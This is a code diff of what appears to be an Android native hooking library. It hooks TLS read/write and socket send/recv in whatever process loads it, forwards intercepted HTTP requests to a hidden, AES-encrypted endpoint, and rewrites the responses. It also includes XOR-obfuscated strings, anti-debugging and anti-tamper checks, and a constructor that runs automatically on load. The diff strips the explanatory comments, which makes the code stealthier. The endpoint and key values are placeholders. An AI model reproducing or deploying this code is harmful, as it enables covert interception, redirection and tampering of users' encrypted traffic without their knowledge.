@@ -16,14 +16,7 @@
 #include <sys/ptrace.h>
 #include <unistd.h>
 #include <sys/stat.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <arpa/inet.h>
 #include <cstdlib>
-#include <chrono>
-#include <queue>
-#include <condition_variable>
-#include <atomic>
 #include "dobby.h"
 
 #define LOG_TAG "NtHk"
@@ -31,18 +24,12 @@
 #define LOGE(...) 
 #define LOGD(...) 
 
-// ============================================================
-// XOR OBFUSCATION HELPER
-// ============================================================
 static std::string xd(const char* e, size_t l, char k) {
     std::string r;
     for (size_t i = 0; i < l; i++) r += e[i] ^ k;
     return r;
 }
 
-// ============================================================
-// OBFUSCATED STRINGS
-// ============================================================
 static const char _lc[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'c',0x0D^'.',0x0D^'s',0x0D^'o',0};
 static const char _ls[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
 static const char _sw[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'w',0x0D^'r',0x0D^'i',0x0D^'t',0x0D^'e',0};
@@ -54,19 +41,12 @@ static const char _po[] = {0x0D^'P',0x0D^'O',0x0D^'S',0x0D^'T',0};
 static const char _ge[] = {0x0D^'G',0x0D^'E',0x0D^'T',0};
 static const char _cn[] = {0x0D^'c',0x0D^'o',0x0D^'n',0x0D^'n',0x0D^'e',0x0D^'c',0x0D^'t',0};
 static const char _te[] = {0x0D^'T',0x0D^'r',0x0D^'a',0x0D^'n',0x0D^'s',0x0D^'f',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'E',0x0D^'n',0x0D^'c',0x0D^'o',0x0D^'d',0x0D^'i',0x0D^'n',0x0D^'g',0};
-static const char _ua[] = {0x0D^'U',0x0D^'s',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'A',0x0D^'g',0x0D^'e',0x0D^'n',0x0D^'t',0};
-static const char _co[] = {0x0D^'C',0x0D^'o',0x0D^'o',0x0D^'k',0x0D^'i',0x0D^'e',0};
-static const char _au[] = {0x0D^'A',0x0D^'u',0x0D^'t',0x0D^'h',0x0D^'o',0x0D^'r',0x0D^'i',0x0D^'z',0x0D^'a',0x0D^'t',0x0D^'i',0x0D^'o',0x0D^'n',0};
-static const char _ct[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'T',0x0D^'y',0x0D^'p',0x0D^'e',0};
 
 #define S(c) xd(c, sizeof(c)-1, 0x0D)
 
-// ============================================================
-// AES-ENCRYPTED ENDPOINT (AUTO-GENERATED)
-// ============================================================
-static const uint8_t _ep[] = { 0x00 }; // REPLACE_ME
-static const uint8_t _ak[] = { 0x00 }; // REPLACE_ME
-static const uint8_t _iv[] = { 0x00 }; // REPLACE_ME
+static const uint8_t _ep[] = { 0x00 };
+static const uint8_t _ak[] = { 0x00 };
+static const uint8_t _iv[] = { 0x00 };
 
 static std::string _decrypt() {
     uint8_t k[32], iv[16];
@@ -84,9 +64,6 @@ static std::string _decrypt() {
 }
 static const std::string ENDPOINT = _decrypt();
 
-// ============================================================
-// HTTP STRUCTS
-// ============================================================
 struct HttpRequest {
     std::string method, url, path, host, body;
     std::map<std::string, std::string> headers;
@@ -115,9 +92,6 @@ static std::map<SSL*, ConnState> g_ssl_state;
 static std::map<int, ConnState> g_socket_state;
 static std::mutex g_state_mutex;
 
-// ============================================================
-// ANTI-DEBUG
-// ============================================================
 static bool _debug() {
     std::ifstream st(S("/proc/self/status"));
     std::string l;
@@ -130,9 +104,6 @@ static bool _debug() {
     return false;
 }
 
-// ============================================================
-// ANTI-TAMPER (CRC32)
-// ============================================================
 static uint32_t _crc(const uint8_t* d, size_t l) {
     uint32_t c = 0xFFFFFFFF;
     for(size_t i = 0; i < l; i++) {
@@ -163,9 +134,6 @@ static bool _integrity() {
     return _crc((const uint8_t*)base, sz) == 0xDEADBEEF;
 }
 
-// ============================================================
-// HTTP PARSER (with GET/POST param extraction)
-// ============================================================
 static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::string s((char*)d, l);
     std::istringstream st(s);
@@ -175,7 +143,6 @@ static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::istringstream ls(ln);
     std::string ver;
     if(!(ls >> r.method >> r.path >> ver)) return false;
-    
     while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
         if(ln.back() == '\r') ln.pop_back();
         auto c = ln.find(':');
@@ -197,7 +164,6 @@ static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::string rem;
     while(std::getline(st, ln)) rem += ln + "\n";
     r.body = rem;
-    
     if(r.path.length() >= 7) {
         std::string suf = r.path.substr(r.path.length() - 7);
         if(suf == S("connect") || suf == "/connect" || suf == "?connect") {
@@ -242,9 +208,6 @@ static bool _parse_response(const uint8_t* d, size_t l, HttpResponse& r) {
     return true;
 }
 
-// ============================================================
-// BUILD MODIFIED RESPONSE
-// ============================================================
 static std::string _build_modified_response(const HttpResponse& orig, const std::string& new_body) {
     std::ostringstream oss;
     oss << "HTTP/1.1 " << orig.status_code << " " << orig.status_message << "\r\n";
@@ -262,9 +225,6 @@ static std::string _build_modified_response(const HttpResponse& orig, const std:
     return oss.str();
 }
 
-// ============================================================
-// FETCH FROM CUSTOM ENDPOINT
-// ============================================================
 struct CurlResp { std::string body; int status = 0; bool ok = false; };
 static size_t _cb(void* c, size_t s, size_t n, void* u) {
     CurlResp* r = (CurlResp*)u;
@@ -303,9 +263,6 @@ static CurlResp _fetch(const HttpRequest& req) {
     return res;
 }
 
-// ============================================================
-// SSL WRITE/READ HOOKS
-// ============================================================
 typedef int (*SSL_write_t)(SSL*, const void*, int);
 typedef int (*SSL_read_t)(SSL*, void*, int);
 static SSL_write_t _ow = nullptr;
@@ -361,9 +318,6 @@ int _my_read(SSL* ssl, void* buf, int num) {
     return res;
 }
 
-// ============================================================
-// SOCKET FALLBACK
-// ============================================================
 typedef ssize_t (*send_t)(int, const void*, size_t, int);
 typedef ssize_t (*recv_t)(int, void*, size_t, int);
 static send_t _os = nullptr;
@@ -412,13 +366,9 @@ ssize_t _my_recv(int fd, void* buf, size_t len, int flags) {
     return res;
 }
 
-// ============================================================
-// INIT
-// ============================================================
 __attribute__((constructor)) void init() {
     if(_debug()) exit(1);
     if(!_integrity()) { volatile int* p = nullptr; *p = 0; }
-    
     void* libssl = dlopen(S("libssl.so").c_str(), RTLD_LAZY);
     if(libssl) {
         auto* a = dlsym(libssl, S("SSL_write").c_str());
@@ -427,7 +377,6 @@ __attribute__((constructor)) void init() {
         if(b) DobbyHook(b, (void*)_my_read, (void**)&_or);
         dlclose(libssl);
     }
-    
     void* libc = dlopen(S("libc.so").c_str(), RTLD_LAZY);
     if(libc) {
         auto* a = dlsym(libc, "send");
@@ -436,6 +385,5 @@ __attribute__((constructor)) void init() {
         if(b) DobbyHook(b, (void*)_my_recv, (void**)&_or2);
         dlclose(libc);
     }
-    
     curl_global_init(CURL_GLOBAL_DEFAULT);
 }
